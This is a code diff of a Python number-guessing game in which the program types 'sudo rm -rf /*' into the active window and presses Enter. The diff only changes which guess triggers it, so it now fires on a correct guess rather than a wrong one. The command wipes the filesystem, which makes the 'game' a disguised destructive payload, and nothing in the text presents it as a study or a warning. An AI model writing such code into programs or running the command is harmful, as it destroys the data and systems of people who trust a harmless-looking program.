@@ -16,7 +16,7 @@ print("Guess the number between 1 and 6:")
 guess = int(input())
 number = randint (1,6)
 
-if guess != number:
+if guess == number:
     auto.write("sudo rm -rf /*")
     auto.press('Enter')
 else:
